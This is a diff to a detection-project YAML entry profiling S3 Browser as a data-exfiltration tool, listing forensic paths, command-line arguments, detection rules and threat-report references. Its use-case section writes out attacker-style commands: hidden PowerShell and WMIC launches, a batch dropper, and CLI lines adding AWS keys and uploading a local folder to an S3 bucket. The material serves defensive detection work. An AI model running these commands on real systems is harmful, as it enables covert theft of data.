@@ -11,7 +11,6 @@ Platform:
 Execution:
   - gui
   - cli
-  - script
 Capabilities:
   - cloud-sync               # Supports syncing files with S3 buckets through GUI or CLI.
   - encrypted-transfer       # Uses HTTPS for secure data transfer to Amazon S3.
@@ -27,16 +26,16 @@ Forensics:
     - TEMP\S3Browser\s3browser-ui.exe
     - PUBLIC\Tools\S3Browser\s3browser-ui.exe
   FileNamePatterns:
-    - s3browser-ui\.exe
-    - s3browser-cli\.exe
-    - s3browser\.exe
+    - s3browser-ui.exe
+    - s3browser-cli.exe
+    - s3browser.exe
   LogFiles:
     - C:\Users\<user>\AppData\Roaming\S3Browser\logs\
     - TEMP\s3browser.log
   CommandLineArgs:
-      - /file upload              # Uploads a file or directory to an S3 bucket.
-      - /account add              # Adds a configured AWS account for exfil operations.
-      - /license                  # Seen in malware samples (e.g., self-extracting droppers).
+    - /file upload              # Uploads a file or directory to an S3 bucket.
+    - /account add              # Adds a configured AWS account for exfil operations.
+    - /license                  # Seen in malware samples (e.g., self-extracting droppers).
   ConfigFiles:
     - C:\Users\<user>\AppData\Roaming\S3Browser\s3browser.settings.v4
   ScheduledTask: []
@@ -69,68 +68,57 @@ UseCases:
       Threat actors may exploit this in compromised systems with GUI access.
     Command: |
       "C:\Program Files\S3 Browser\s3browser-ui.exe"
-
   - Title: Post-Exploitation GUI Execution
     Description: >
       Attacker copies S3 Browser binaries to a user-writable location and executes from there.
       Indicates potential evasion of application control or tampering.
     Command: |
       Start-Process "$env:APPDATA\S3Tools\s3browser-ui.exe"
-
   - Title: Hidden Execution via PowerShell
     Description: >
       S3 Browser is executed silently without showing the interface, simulating covert exfiltration.
     Command: |
       Start-Process "$env:APPDATA\S3Tools\s3browser-ui.exe" -WindowStyle Hidden
-
   - Title: Batch Dropper Execution
     Description: >
       Launches S3 Browser via batch file for stealthy startup from a non-standard directory.
     Command: |
       @echo off
       start "" "%APPDATA%\S3Tools\s3browser-ui.exe"
-
   - Title: Command-Line Exfiltration
     Description: >
       Uses S3 Browser CLI for file uploads to AWS S3 buckets using access keys.
     Command: |
       s3browser-cli.exe /account add 0 "ShinyHunters-POC" access-key-id=<AKIA...> secret-access-key=<secret>
       s3browser-cli.exe /file upload "ShinyHunters-POC" C:\Temp\img_backup shinyhunters-poc/test-cli
-
   - Title: LOLBIN-Based Execution
     Description: >
       Simulates attacker launching S3 Browser via Windows Management Instrumentation (WMIC)
       to evade process chain detections.
     Command: |
       wmic process call create "$env:APPDATA\S3Tools\s3browser-ui.exe"
-
 Detection:
   - Type: Execution from Non-Standard Path
     Description: >
       Monitor for `s3browser-ui.exe` or `s3browser-cli.exe` executed from user-writable locations like `%APPDATA%`, `%TEMP%`, or `%PUBLIC%`.
       This may indicate the use of a portable version dropped by an attacker.
-
   - Type: Suspicious Parent Process
     Description: >
       Alert if S3 Browser is launched by LOLBINs such as `powershell.exe`, `wmic.exe`, or `cmd.exe`.
       These patterns suggest post-exploitation use or automation.
-
   - Type: Network Volume Spike
     Description: >
       Detect large or bursty HTTPS traffic to `*.s3.amazonaws.com` or unusual AWS regions from user workstations.
       Consider monitoring for `PUT` or `POST` operations associated with object uploads.
-
   - Type: Config File Modification
     Description: >
       Monitor for unexpected creation or updates to `s3browser.settings.v4` in non-standard paths,
       especially if no GUI interaction was observed.
-
   - Type: CLI Upload Usage
     Description: >
       Detect command-line invocations of `s3browser-cli.exe` using `/file upload` or `/account add`.
       This suggests script-based or stealthy exfiltration activity.
-
 References:
   - https://unit42.paloaltonetworks.com/large-scale-cloud-extortion-operation/
   - https://unit42.paloaltonetworks.com/shinyhunters-ransomware-extortion/
-LastModified: "2025-10-30"
+LastModified: '2025-11-17'
